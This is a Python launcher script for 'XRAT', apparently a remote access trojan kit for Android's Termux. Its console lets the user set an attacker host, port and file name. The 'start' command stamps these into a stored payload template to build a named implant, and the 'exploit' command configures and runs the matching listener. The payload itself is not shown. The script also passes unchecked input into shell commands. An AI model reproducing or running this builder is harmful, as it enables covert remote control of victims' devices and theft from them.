# 24/12/2022 13:54
# Sara Issam 
import os
import sys
import socket
import time
import subprocess

W='\33[0m'
R='\33[1;31m'
G='\33[1;32m'
gr='\033[1;30m'
O='\33[1;33m'
B='\33[1;34m'
os.system('cd config && rm -rif idd.txt')
os.system('cd config && bash con.sh > idd.txt')
os.system('clear')
try:
	isoa=os.path.exists('/data/data/com.termux/files/usr/etc/')
	if isoa == False:
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
	back=os.path.exists('backstart/helper/__backhelp__.py')
	if back == False:
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
	con=os.path.exists('config/con.sh')
	if con == False:
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
	aa=os.path.exists('__main__/__payload__')
	if aa == False: 
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
	sa=os.path.exists('Target/')
	if sa == False:
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
	up=os.path.exists('__update__/')
	if up == False:
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
	back=os.path.exists('backstart/__main__.py')
	if back == False:
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
	lg=os.path.exists("logo/__logo__.py")
	if lg == False:
		print(R+'[*] Error data')
		sys.exit()
	print(f"{W}[{R}✓{W}]{G} done")
	time.sleep(1)
except:
	print('')
	sys.exit()
try:
	from Help import __Help__
	from logo import __logo__
except:
	print('[!] data Error')
	sys.exit()
sss=socket.gethostname()
iii=socket.gethostbyname(sss)
def bb():
	print(f'{W}[{R}+{W}] Loding{R}  ',end='',flush=True)
	for m in range(12):
		for ii in r'-\|/|\-/':
			print('\b',ii,end='',sep='',flush=True)
			time.sleep(0.03)
def update():
	bb()
	print(W)
	os.system('pkg update -y') 
	os.system('pkg upgrade -y')
	os.system('pkg install python -y')
	os.system('pkg install python2 -y')
	os.system('pkg install python3 -y')
	os.system('pkg install ruby -y')
	os.system('pkg install git -y')
	os.system('pkg install php -y')
	os.system('pkg install java -y')
	os.system('pkg install bash -y')
	os.system('pkg install perl -y')
	os.system('pkg install nmap -y')
	os.system('pkg install clang -y')
	os.system('pkg install macchanger -y')
	os.system('pkg install nano -y')
	os.system('pkg install cowsay -y')
	os.system('pkg install curl -y')
	os.system('pkg install tar -y')
	os.system('pkg install zip -y')
	os.system('pkg install unzip -y')
	os.system('pkg install tor -y')
	os.system('pkg install sudo -y')
	os.system('pkg install wget -y')
	os.system('pkg install wcalc -y')
	os.system('pkg install openssl -y')
	os.system('pkg install bmon -y')
def start():
	__logo__.logo()
	#os.system('cd config && cat idd.txt')
	#os.system('cd config')
	dd=open('config/idd.txt','r')
	print(f'{W}[{R}+{W}]{G} address{W}')
	xx=dd.read()
	print(O+xx)
	while True:
		sara=input(R+f"XRAT{O}:{G}{sss}{O}:{W}#/>{W} "+W)
		sata=sara.strip()
		if sara[:8] == 'set host':
			host=sara[9:]
		if sara[:8] == 'set port':
			port=sara[9:]
		if sara[:8] == 'set name':
			name=sara[9:]
		if sara == 'clear':
			os.system('clear')
			__logo__.logo()
			print(f'{W}[{R}+{W}]{G} address{W}')
			print(O+xx)
		if sara == 'banner':
			os.system('clear')
			__logo__.logo()
			print(f'{W}[{R}+{W}]{G} address{W}')
			print(O+xx)
		if sara == 'help':
			__Help__.Help()
		if sara == 'start' or sara == 'run':
			time.sleep(0.9)
			bb()
			print('')
			os.system('cd __main__ && cp __payload__ new')
			os.system(f"cd __main__ && sed -i 's/$1/{host}/g' new")
			os.system(f"cd __main__ && sed -i 's/$2/{port}/g' new")
			os.system('cd __main__ && python3 __march__.py')
			os.system(f'cd __main__ && mv new {name}')
			time.sleep(0.4)
			print(f'{W}[{R}*{W}]{B} Host{O} >{G} {host}')
			time.sleep(0.4)
			print(f'{W}[{R}*{W}]{B} Port{O} >{G} {port}')
			time.sleep(0.4)
			print(f'{W}[{R}*{W}]{B} Name{O} >{G} {name}')
			time.sleep(0.4)
		if sara == 'exploit':
			bb()
			print('')
			#backstart
			os.system(f'cd backstart && cp __main__.py __issam__.py')
			os.system(f"cd backstart && sed -i 's/$1/{host}/g' __issam__.py")
			os.system(f"cd backstart && sed -i 's/$2/{port}/g' __issam__.py")
			os.system(f'cd backstart && python3 __issam__.py')
			os.system(f'cd backstart && rm -rif __issam__.py')			
		if sara == 'exit':
			time.sleep(1)
			break;
try:
	start()
except KeyboardInterrupt:
	print('[!] Eroor')
	time.sleep(1)
	sys.exit()
except:
	print('[!] error')
# Coding bay issam 
